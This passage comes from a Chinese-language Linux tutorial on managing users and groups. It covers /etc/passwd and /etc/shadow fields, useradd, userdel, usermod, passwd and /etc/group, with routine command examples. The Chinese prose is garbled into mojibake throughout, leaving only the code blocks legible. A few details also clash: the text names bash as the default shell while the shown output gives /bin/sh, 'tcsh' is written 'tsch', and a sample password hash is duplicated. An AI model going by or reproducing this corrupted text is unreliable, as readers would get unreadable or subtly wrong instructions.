ç”¨æˆ·è´¦æˆ·çš„UIDï¼ˆæ•°å­—å½¢å¼ï¼‰</li><li> ç”¨æˆ·è´¦æˆ·çš„ç»„IDï¼ˆ GIDï¼‰ï¼ˆæ•°å­—å½¢å¼ï¼‰</li><li> ç”¨æˆ·è´¦æˆ·çš„æ–‡æœ¬æè¿°ï¼ˆç§°ä¸ºå¤‡æ³¨å­—æ®µï¼‰</li><li> ç”¨æˆ·HOMEç›®å½•çš„ä½ç½®</li><li> ç”¨æˆ·çš„é»˜è®¤shell  </li></ul><p>å‡ºäºå®‰å…¨ï¼Œ<code>etc/passwd</code>æ–‡ä»¶ä¸­çš„å¯†ç å­—æ®µéƒ½è¢«è®¾ç½®æˆäº†xï¼Œè¿™å¹¶ä¸æ˜¯è¯´æ‰€æœ‰çš„ç”¨æˆ·è´¦æˆ·éƒ½ç”¨ç›¸åŒçš„å¯†ç ã€‚ç»å¤§å¤šæ•°Linuxç³»ç»Ÿéƒ½å°†ç”¨æˆ·å¯†ç ä¿å­˜åœ¨å¦ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ˆå«ä½œshadowæ–‡ä»¶ï¼Œä½ç½®åœ¨<code>/etc/shadow</code>ï¼‰ã€‚åªæœ‰ç‰¹å®šçš„ç¨‹åºï¼ˆæ¯”å¦‚ç™»å½•ç¨‹åºï¼‰æ‰èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶ã€‚    </p><p> <code> /etc/passwd</code>æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ–‡æœ¬æ–‡ä»¶ã€‚å¯ä»¥ç”¨ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨åœ¨<code>/etc/password</code>æ–‡ä»¶é‡Œç›´æ¥è¿›è¡Œç”¨æˆ·ç®¡ç†ï¼ˆæ¯”å¦‚æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤ç”¨æˆ·è´¦æˆ·ï¼‰ã€‚ä½†è¿™æ ·åšæå…¶å±é™©ã€‚å¦‚æœ<code>/etc/passwd</code>æ–‡ä»¶å‡ºç°æŸåï¼Œç³»ç»Ÿå°±æ— æ³•è¯»å–å®ƒçš„å†…å®¹äº†ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç”¨æˆ·æ— æ³•æ­£å¸¸ç™»å½•ï¼ˆå³ä¾¿æ˜¯rootç”¨æˆ·ï¼‰ã€‚  </p><h4 id="7-1-2-etc-shadow-æ–‡ä»¶"><a href="#7-1-2-etc-shadow-æ–‡ä»¶" class="headerlink" title="7.1.2 /etc/shadow æ–‡ä»¶"></a>7.1.2<code> /etc/shadow</code> æ–‡ä»¶</h4><p>åªæœ‰rootç”¨æˆ·æ‰èƒ½è®¿é—®<code>/etc/shadow</code>æ–‡ä»¶ï¼Œè¿™è®©å®ƒæ¯”èµ·<code>/etc/passwd</code>å®‰å…¨è®¸å¤š ã€‚</p><p><code>/etc/shadow</code>æ–‡ä»¶ä¸ºç³»ç»Ÿä¸Šçš„æ¯ä¸ªç”¨æˆ·è´¦æˆ·éƒ½ä¿å­˜äº†ä¸€æ¡è®°å½•ã€‚è®°å½•å°±åƒä¸‹é¢è¿™æ ·ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rich:<span class="token variable">$1</span>$.FfcK0ns<span class="token variable">$f1UgiyHQ25wrB</span>/hykCn020:11627:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> ä¸<code>/etc/passwd</code>æ–‡ä»¶ä¸­çš„ç™»å½•åå­—æ®µå¯¹åº”çš„ç™»å½•å</li><li> åŠ å¯†åçš„å¯†ç </li><li> è‡ªä¸Šæ¬¡ä¿®æ”¹å¯†ç åè¿‡å»çš„å¤©æ•°å¯†ç ï¼ˆè‡ª1970å¹´1æœˆ1æ—¥å¼€å§‹è®¡ç®—ï¼‰</li><li> å¤šå°‘å¤©åæ‰èƒ½æ›´æ”¹å¯†ç </li><li> å¤šå°‘å¤©åå¿…é¡»æ›´æ”¹å¯†ç </li><li> å¯†ç è¿‡æœŸå‰æå‰å¤šå°‘å¤©æé†’ç”¨æˆ·æ›´æ”¹å¯†ç   </li><li> å¯†ç è¿‡æœŸåå¤šå°‘å¤©ç¦ç”¨ç”¨æˆ·è´¦æˆ·</li><li> ç”¨æˆ·è´¦æˆ·è¢«ç¦ç”¨çš„æ—¥æœŸï¼ˆç”¨è‡ª1970å¹´1æœˆ1æ—¥åˆ°å½“å¤©çš„å¤©æ•°è¡¨ç¤ºï¼‰</li><li> é¢„ç•™å­—æ®µç»™å°†æ¥ä½¿ç”¨  </li></ul><p>ä½¿ç”¨shadowå¯†ç ç³»ç»Ÿåï¼Œ Linuxç³»ç»Ÿå¯ä»¥æ›´å¥½åœ°æ§åˆ¶ç”¨æˆ·å¯†ç ã€‚å¯ä»¥æ§åˆ¶ç”¨æˆ·å¤šä¹…æ›´æ”¹ä¸€æ¬¡å¯†ç ï¼Œä»¥åŠä»€ä¹ˆæ—¶å€™ç¦ç”¨è¯¥ç”¨æˆ·è´¦æˆ·ï¼Œå¦‚æœå¯†ç æœªæ›´æ–°çš„è¯ã€‚  </p><h4 id="7-1-3-æ·»åŠ æ–°ç”¨æˆ·"><a href="#7-1-3-æ·»åŠ æ–°ç”¨æˆ·" class="headerlink" title="7.1.3 æ·»åŠ æ–°ç”¨æˆ·"></a>7.1.3 æ·»åŠ æ–°ç”¨æˆ·</h4><p>å‘Linuxç³»ç»Ÿæ·»åŠ æ–°ç”¨æˆ·çš„ä¸»è¦å·¥å…·æ˜¯<code>useradd </code>ï¼Œå¯ä»¥ä¸€æ¬¡æ€§åˆ›å»ºæ–°ç”¨æˆ·è´¦æˆ·åŠè®¾ç½®ç”¨æˆ·HOMEç›®å½•ç»“æ„ã€‚<code>useradd</code>å‘½ä»¤ä½¿ç”¨ç³»ç»Ÿçš„é»˜è®¤å€¼ä»¥åŠå‘½ä»¤è¡Œå‚æ•°æ¥è®¾ç½®ç”¨æˆ·è´¦æˆ·ã€‚ç³»ç»Ÿé»˜è®¤å€¼è¢«è®¾ç½®åœ¨<code>/etc/default/useradd</code>æ–‡ä»¶ä¸­ã€‚å¯ä»¥ä½¿ç”¨åŠ å…¥äº†-Dé€‰é¡¹çš„<code>useradd</code>å‘½ä»¤æŸ¥çœ‹æ‰€ç”¨Linuxç³»ç»Ÿä¸­çš„è¿™äº›é»˜è®¤å€¼ã€‚     </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># /usr/sbin/useradd -D</span><span class="token assign-left variable">GROUP</span><span class="token operator">=</span><span class="token number">100</span><span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home<span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span>-1<span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/sh<span class="token assign-left variable">SKEL</span><span class="token operator">=</span>/etc/skel<span class="token assign-left variable">CREATE_MAIL_SPOOL</span><span class="token operator">=</span>no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨åˆ›å»ºæ–°ç”¨æˆ·æ—¶ï¼Œå¦‚æœä¸åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šå…·ä½“çš„å€¼ï¼Œ <code>useradd</code>å‘½ä»¤ä¼šä½¿ç”¨-Dé€‰é¡¹æ˜¾ç¤ºçš„é‚£äº›é»˜è®¤å€¼ã€‚è¿™ä¸ªä¾‹å­åˆ—å‡ºçš„é»˜è®¤å€¼å¦‚ä¸‹ï¼š  </p><ul><li> æ–°ç”¨æˆ·ä¼šè¢«æ·»åŠ åˆ°GIDä¸º100çš„å…¬å…±ç»„ï¼›</li><li> æ–°ç”¨æˆ·çš„HOMEç›®å½•å°†ä¼šä½äº/<code>home/loginname</code>ï¼›</li><li> æ–°ç”¨æˆ·è´¦æˆ·å¯†ç åœ¨è¿‡æœŸåä¸ä¼šè¢«ç¦ç”¨ï¼›</li><li> æ–°ç”¨æˆ·è´¦æˆ·æœªè¢«è®¾ç½®è¿‡æœŸæ—¥æœŸï¼›</li><li> æ–°ç”¨æˆ·è´¦æˆ·å°†bash shellä½œä¸ºé»˜è®¤shellï¼›</li><li> ç³»ç»Ÿä¼šå°†<code>/etc/skel</code>ç›®å½•ä¸‹çš„å†…å®¹å¤åˆ¶åˆ°ç”¨æˆ·çš„HOMEç›®å½•ä¸‹ï¼›</li><li> ç³»ç»Ÿä¸ºè¯¥ç”¨æˆ·è´¦æˆ·åœ¨mailç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç”¨äºæ¥æ”¶é‚®ä»¶çš„æ–‡ä»¶ã€‚  </li></ul><p>å€’æ•°ç¬¬äºŒä¸ªå€¼å¾ˆæœ‰æ„æ€ã€‚ <code>useradd</code>å‘½ä»¤å…è®¸ç®¡ç†å‘˜åˆ›å»ºä¸€ä»½é»˜è®¤çš„HOMEç›®å½•é…ç½®ï¼Œç„¶åæŠŠå®ƒä½œä¸º<strong>åˆ›å»ºæ–°ç”¨æˆ·HOMEç›®å½•çš„æ¨¡æ¿</strong>ã€‚è¿™æ ·å°±èƒ½è‡ªåŠ¨åœ¨æ¯ä¸ªæ–°ç”¨æˆ·çš„HOMEç›®å½•é‡Œæ”¾ç½®é»˜è®¤çš„ç³»ç»Ÿæ–‡ä»¶ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -al /etc/skel</span>total <span class="token number">20</span>drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Jan <span class="token number">10</span>  <span class="token number">2020</span> <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">89</span> root root <span class="token number">4096</span> Jan <span class="token number">28</span> <span class="token number">14</span>:47 <span class="token punctuation">..</span>-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">220</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .bash_logout-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3526</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .bashrc-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">807</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> .profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®ƒä»¬æ˜¯bash shellç¯å¢ƒçš„æ ‡å‡†å¯åŠ¨æ–‡ä»¶ã€‚ç³»ç»Ÿä¼šè‡ªåŠ¨å°†è¿™äº›é»˜è®¤æ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„æ¯ä¸ªç”¨æˆ·çš„HOMEç›®å½•ã€‚ </p><table><thead><tr><th align="center">å‚ æ•°</th><th align="center">æ è¿°</th></tr></thead><tbody><tr><td align="center">-c comment</td><td align="center">ç»™æ–°ç”¨æˆ·æ·»åŠ å¤‡æ³¨</td></tr><tr><td align="center">-d home_dir</td><td align="center">ä¸ºä¸»ç›®å½•æŒ‡å®šä¸€ä¸ªåå­—ï¼ˆå¦‚æœä¸æƒ³ç”¨ç™»å½•åä½œä¸ºä¸»ç›®å½•åçš„è¯ï¼‰</td></tr><tr><td align="center">-e expire_date</td><td align="center">ç”¨YYYY-MM-DDæ ¼å¼æŒ‡å®šä¸€ä¸ªè´¦æˆ·è¿‡æœŸçš„æ—¥æœŸ</td></tr><tr><td align="center">-f inactive_days</td><td align="center">æŒ‡å®šè¿™ä¸ªè´¦æˆ·å¯†ç è¿‡æœŸåå¤šå°‘å¤©è¿™ä¸ªè´¦æˆ·è¢«ç¦ç”¨ï¼› 0è¡¨ç¤ºå¯†ç ä¸€è¿‡æœŸå°±ç«‹å³ç¦ç”¨ï¼Œ 1è¡¨ç¤º ç¦ç”¨è¿™ä¸ªåŠŸèƒ½</td></tr><tr><td align="center">-g initial_group</td><td align="center">æŒ‡å®šç”¨æˆ·ç™»å½•ç»„çš„GIDæˆ–ç»„å</td></tr><tr><td align="center">-G group â€¦</td><td align="center">æŒ‡å®šç”¨æˆ·é™¤ç™»å½•ç»„ä¹‹å¤–æ‰€å±çš„ä¸€ä¸ªæˆ–å¤šä¸ªé™„åŠ ç»„</td></tr><tr><td align="center">-k</td><td align="center">å¿…é¡»å’Œ-mä¸€èµ·ä½¿ç”¨ï¼Œå°†<code>/etc/skel</code>ç›®å½•çš„å†…å®¹å¤åˆ¶åˆ°ç”¨æˆ·çš„HOMEç›®å½•</td></tr><tr><td align="center">-m</td><td align="center">åˆ›å»ºç”¨æˆ·çš„HOMEç›®å½•</td></tr><tr><td align="center">-M</td><td align="center">ä¸åˆ›å»ºç”¨æˆ·çš„HOMEç›®å½•ï¼ˆå½“é»˜è®¤è®¾ç½®é‡Œè¦æ±‚åˆ›å»ºæ—¶æ‰ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ï¼‰</td></tr><tr><td align="center">-n</td><td align="center">åˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·ç™»å½•ååŒåçš„æ–°ç»„</td></tr><tr><td align="center">-r</td><td align="center">åˆ›å»ºç³»ç»Ÿè´¦æˆ·</td></tr><tr><td align="center">-p passwd</td><td align="center">ä¸ºç”¨æˆ·è´¦æˆ·æŒ‡å®šé»˜è®¤å¯†ç </td></tr><tr><td align="center">-s shell</td><td align="center">æŒ‡å®šé»˜è®¤çš„ç™»å½•shell</td></tr><tr><td align="center">-u uid</td><td align="center">ä¸ºè´¦æˆ·æŒ‡å®šå”¯ä¸€çš„UID</td></tr></tbody></table><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>useradd</code>å‘½ä»¤ä¸ä¼šåˆ›å»ºHOMEç›®å½•ï¼Œä½†æ˜¯<code>-m</code>å‘½ä»¤è¡Œé€‰é¡¹ä¼šä½¿å…¶åˆ›å»ºHOMEç›®å½•ã€‚ <code>useradd</code>å‘½ä»¤åˆ›å»ºäº†æ–°HOMEç›®å½•ï¼Œå¹¶å°†<code>/etc/skel</code>ç›®å½•ä¸­çš„æ–‡ä»¶å¤åˆ¶äº†è¿‡æ¥:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># useradd -m test</span><span class="token comment"># ls -al /home/test</span>total <span class="token number">24</span>drwxr-xr-x <span class="token number">2</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">4096</span> <span class="token number">2010</span>-09-23 <span class="token number">19</span>:01 <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">4</span> root root <span class="token number">4096</span> <span class="token number">2010</span>-09-23 <span class="token number">19</span>:01 <span class="token punctuation">..</span>-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">220</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .bash_logout-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">3103</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .bashrc-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">179</span> <span class="token number">2010</span>-03-26 08:31 examples.desktop-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">675</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æ²¡æœ‰ç»™ç”¨æˆ·è®¾ç½®ç™»é™†å¯†ç ï¼Œå¯ä»¥ç”¨å‘½ä»¤ï¼š<code>passwd test</code>ä¿®æ”¹å¯†ç ï¼Œä¹‹åå°±å¯ä»¥ç”¨è¿™ä¸ªå¯†ç ç™»å½•äº†ã€‚è¿™é‡Œæ³¨æ„ä½¿ç”¨<code>useradd -p</code>å‘½ä»¤æ—¶ï¼Œåé¢è·Ÿçš„å¿…é¡»æ˜¯åŠ å¯†åçš„å¯†ç ï¼Œå½¢å¦‚ä¸Šé¢richçš„<code>$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020</code>ã€‚</p><p>å¯ä»¥åœ¨<code>-D</code>é€‰é¡¹åè·Ÿä¸Šä¸€ä¸ªæŒ‡å®šçš„å€¼æ¥ä¿®æ”¹ç³»ç»Ÿé»˜è®¤çš„æ–°ç”¨æˆ·è®¾ç½®:</p><table><thead><tr><th align="center">å‚ æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">-b default_home</td><td align="center">æ›´æ”¹é»˜è®¤çš„åˆ›å»ºç”¨æˆ·HOMEç›®å½•çš„ä½ç½®</td></tr><tr><td align="center">-e expiration_date</td><td align="center">æ›´æ”¹é»˜è®¤çš„æ–°è´¦æˆ·çš„è¿‡æœŸæ—¥æœŸ</td></tr><tr><td align="center">-f inactive</td><td align="center">æ›´æ”¹é»˜è®¤çš„æ–°ç”¨æˆ·ä»å¯†ç è¿‡æœŸåˆ°è´¦æˆ·è¢«ç¦ç”¨çš„å¤©æ•°</td></tr><tr><td align="center">-g group</td><td align="center">æ›´æ”¹é»˜è®¤çš„ç»„åç§°æˆ–GID</td></tr><tr><td align="center">-s shell</td><td align="center">æ›´æ”¹é»˜è®¤çš„ç™»å½•shell</td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># useradd -D -s /bin/tsch</span><span class="token comment"># useradd -D</span><span class="token assign-left variable">GROUP</span><span class="token operator">=</span><span class="token number">100</span><span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home<span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span>-1<span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/tsch<span class="token assign-left variable">SKEL</span><span class="token operator">=</span>/etc/skel<span class="token assign-left variable">CREATE_MAIL_SPOOL</span><span class="token operator">=</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°åœ¨ï¼Œ <code>useradd</code>å‘½ä»¤ä¼šå°†<code>tsch shell</code>ä½œä¸ºæ‰€æœ‰æ–°å»ºç”¨æˆ·çš„é»˜è®¤ç™»å½•shellã€‚  </p><h4 id="7-1-4-åˆ é™¤ç”¨æˆ·"><a href="#7-1-4-åˆ é™¤ç”¨æˆ·" class="headerlink" title="7.1.4 åˆ é™¤ç”¨æˆ·"></a>7.1.4 åˆ é™¤ç”¨æˆ·</h4><p><code>userdel</code>å¯ä»¥ä»ç³»ç»Ÿä¸­åˆ é™¤ç”¨æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>userdel</code>å‘½ä»¤ä¼šåªåˆ é™¤<code>/etc/passwd</code>æ–‡ä»¶ä¸­çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè€Œä¸ä¼šåˆ é™¤ç³»ç»Ÿä¸­å±äºè¯¥è´¦æˆ·çš„ä»»ä½•æ–‡ä»¶ã€‚  åŠ ä¸Š<code>-r</code>å‚æ•°ï¼Œ <code>userdel</code>ä¼šåˆ é™¤ç”¨æˆ·çš„HOMEç›®å½•ä»¥åŠé‚®ä»¶ç›®å½•ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/userdel -r test</span><span class="token comment"># ls -al /home/test</span>ls: cannot access /home/test: No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="7-1-5-ä¿®æ”¹ç”¨æˆ·"><a href="#7-1-5-ä¿®æ”¹ç”¨æˆ·" class="headerlink" title="7.1.5 ä¿®æ”¹ç”¨æˆ·"></a>7.1.5 ä¿®æ”¹ç”¨æˆ·</h4><table><thead><tr><th align="center">å‘½ä»¤</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center"><code>usermod</code></td><td align="center">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„å­—æ®µï¼Œè¿˜å¯ä»¥æŒ‡å®šä¸»è¦ç»„ä»¥åŠé™„åŠ ç»„çš„æ‰€å±å…³ç³»</td></tr><tr><td align="center"><code>passwd</code></td><td align="center">ä¿®æ”¹å·²æœ‰ç”¨æˆ·çš„å¯†ç </td></tr><tr><td align="center"><code>chpasswd</code></td><td align="center">ä»æ–‡ä»¶ä¸­è¯»å–ç™»å½•åå¯†ç å¯¹ï¼Œå¹¶æ›´æ–°å¯†ç </td></tr><tr><td align="center"><code>chage</code></td><td align="center">ä¿®æ”¹å¯†ç çš„è¿‡æœŸæ—¥æœŸ</td></tr><tr><td align="center"><code>chfn</code></td><td align="center">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„å¤‡æ³¨ä¿¡æ¯</td></tr><tr><td align="center"><code>chsh</code></td><td align="center">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„é»˜è®¤ç™»å½•shell</td></tr></tbody></table><h5 id="1-usermod"><a href="#1-usermod" class="headerlink" title="1.usermod"></a>1.<code>usermod</code></h5><p><code>usermod</code>å‘½ä»¤èƒ½ä¿®æ”¹<code>/etc/passwd</code>æ–‡ä»¶ä¸­çš„å¤§éƒ¨åˆ†å­—æ®µï¼Œåªéœ€ç”¨ä¸æƒ³ä¿®æ”¹çš„å­—æ®µå¯¹åº”çš„å‘½ä»¤è¡Œå‚æ•°å°±å¯ä»¥äº†ã€‚å‚æ•°å¤§éƒ¨åˆ†è·Ÿ<code>useradd</code>å‘½ä»¤çš„å‚æ•°ä¸€æ ·ï¼ˆæ¯”å¦‚ï¼Œ -cä¿®æ”¹å¤‡æ³¨å­—æ®µï¼Œ -eä¿®æ”¹è¿‡æœŸæ—¥æœŸï¼Œ -gä¿®æ”¹é»˜è®¤çš„ç™»å½•ç»„ï¼‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€äº›å¯èƒ½æ´¾ä¸Šç”¨åœºçš„é€‰é¡¹ï¼š</p><ul><li><code> -l</code>ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„ç™»å½•åã€‚</li><li><code> -L</code>é”å®šè´¦æˆ·ï¼Œä½¿ç”¨æˆ·æ— æ³•ç™»å½•ã€‚</li><li><code> -p</code>ä¿®æ”¹è´¦æˆ·çš„å¯†ç ã€‚</li><li><code> -U</code>è§£é™¤é”å®šï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿç™»å½•ã€‚  </li></ul><h5 id="2-passwdå’Œchpasswd"><a href="#2-passwdå’Œchpasswd" class="headerlink" title="2.passwdå’Œchpasswd "></a>2.<code>passwd</code>å’Œ<code>chpasswd </code></h5><p> æ”¹å˜ç”¨æˆ·å¯†ç çš„ä¸€ä¸ªç®€ä¾¿æ–¹æ³•å°±æ˜¯ç”¨passwdå‘½ä»¤ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># passwd test</span>Changing password <span class="token keyword">for</span> user test.New UNIX password:Retype new UNIX password:passwd: all authentication tokens updated successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-e</code>é€‰é¡¹èƒ½å¼ºåˆ¶ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ä¿®æ”¹å¯†ç ã€‚ä½ å¯ä»¥å…ˆç»™ç”¨æˆ·è®¾ç½®ä¸€ä¸ªç®€å•çš„å¯†ç ï¼Œä¹‹åå†å¼ºåˆ¶`åœ¨ä¸‹æ¬¡ç™»å½•æ—¶æ”¹æˆä»–ä»¬èƒ½è®°ä½çš„æ›´å¤æ‚çš„å¯†ç ã€‚  </p><h3 id="7-2-ä½¿ç”¨-Linux-ç»„"><a href="#7-2-ä½¿ç”¨-Linux-ç»„" class="headerlink" title="7.2 ä½¿ç”¨ Linux ç»„"></a>7.2 ä½¿ç”¨ Linux ç»„</h3><p>ç»„æƒé™å…è®¸å¤šä¸ªç”¨æˆ·å¯¹ç³»ç»Ÿä¸­çš„å¯¹è±¡ï¼ˆæ¯”å¦‚æ–‡ä»¶ã€ç›®å½•æˆ–è®¾å¤‡ç­‰ï¼‰å…±äº«ä¸€ç»„å…±ç”¨çš„æƒé™ã€‚</p><h4 id="7-2-1-etc-group-æ–‡ä»¶"><a href="#7-2-1-etc-group-æ–‡ä»¶" class="headerlink" title="7.2.1 /etc/group æ–‡ä»¶"></a>7.2.1 <code>/etc/group </code>æ–‡ä»¶</h4><p>ä¸ç”¨æˆ·è´¦æˆ·ç±»ä¼¼ï¼Œç»„ä¿¡æ¯ä¹Ÿä¿å­˜åœ¨ç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚<code> /etc/group</code>æ–‡ä»¶åŒ…å«ç³»ç»Ÿä¸Šç”¨åˆ°çš„æ¯ä¸ªç»„çš„ä¿¡æ¯ã€‚ä¸‹é¢æ˜¯ä¸€äº›æ¥è‡ªLinuxç³»ç»Ÿä¸Š<code>/etc/group</code>æ–‡ä»¶ä¸­çš„å…¸å‹ä¾‹å­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root:x:0:rootbin:x:1:root,bin,daemondaemon:x:2:root,bin,daemonsys:x:3:root,bin,admadm:x:4:root,adm,daemonrich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <code> /etc/group</code>æ–‡ä»¶æœ‰4ä¸ªå­—æ®µï¼š</p><ul><li> ç»„å</li><li> ç»„å¯†ç </li><li> GID</li><li> å±äºè¯¥ç»„çš„ç”¨æˆ·åˆ—è¡¨  </li></ul><p>å’ŒUIDä¸€æ ·ï¼Œ GIDåœ¨åˆ†é…æ—¶ä¹Ÿé‡‡ç”¨äº†ç‰¹å®šçš„æ ¼å¼ã€‚ç³»ç»Ÿè´¦æˆ·ç”¨çš„ç»„é€šå¸¸ä¼šåˆ†é…ä½äº500çš„GIDå€¼ï¼Œè€Œç”¨æˆ·ç»„çš„GIDåˆ™ä¼šä»500å¼€å§‹åˆ†é…ã€‚   </p><p><font color="red" size="3">åƒä¸‡ä¸èƒ½é€šè¿‡ç›´æ¥ä¿®æ”¹<code>/etc/group</code>æ–‡ä»¶æ¥æ·»åŠ ç”¨æˆ·åˆ°ä¸€ä¸ªç»„ï¼Œè¦ç”¨<code>usermod</code>å‘½ä»¤</font>ï¼ˆåœ¨7.1èŠ‚ä¸­ä»‹ç»è¿‡ï¼‰ã€‚åœ¨æ·»åŠ ç”¨æˆ·åˆ°ä¸åŒçš„ç»„ä¹‹å‰ï¼Œé¦–å…ˆå¾—åˆ›å»ºç»„ã€‚  </p><h4 id="7-2-2-åˆ›å»ºæ–°ç»„"><a href="#7-2-2-åˆ›å»ºæ–°ç»„" class="headerlink" title="7.2.2 åˆ›å»ºæ–°ç»„"></a>7.2.2 åˆ›å»ºæ–°ç»„</h4><p><code>groupadd</code>å‘½ä»¤å¯åœ¨ç³»ç»Ÿä¸Šåˆ›å»ºæ–°ç»„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/groupadd shared</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:shared:x:505:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨åˆ›å»ºæ–°ç»„æ—¶ï¼Œé»˜è®¤æ²¡æœ‰ç”¨æˆ·è¢«åˆ†é…åˆ°è¯¥ç»„ã€‚ <code>groupadd</code>å‘½ä»¤æ²¡æœ‰æä¾›å°†ç”¨æˆ·æ·»åŠ åˆ°ç»„ä¸­çš„é€‰é¡¹ï¼Œä½†å¯ä»¥ç”¨<code>usermod</code>å‘½ä»¤æ¥å¼¥è¡¥è¿™ä¸€ç‚¹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/usermod -G shared rich</span><span class="token comment"># /usr/sbin/usermod -G shared test</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:shared:x:505:rich, <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>è­¦å‘Š</strong> ä¸ºç”¨æˆ·è´¦æˆ·åˆ†é…ç»„æ—¶è¦æ ¼å¤–å°å¿ƒã€‚å¦‚æœåŠ äº†<code>-g</code>é€‰é¡¹ï¼ŒæŒ‡å®šçš„ç»„åä¼šæ›¿æ¢æ‰è¯¥è´¦æˆ·çš„é»˜è®¤ç»„ã€‚<code> -G</code>é€‰é¡¹åˆ™å°†è¯¥ç»„æ·»åŠ åˆ°ç”¨æˆ·çš„å±ç»„çš„åˆ—è¡¨é‡Œï¼Œä¸ä¼šå½±å“é»˜è®¤ç»„ã€‚  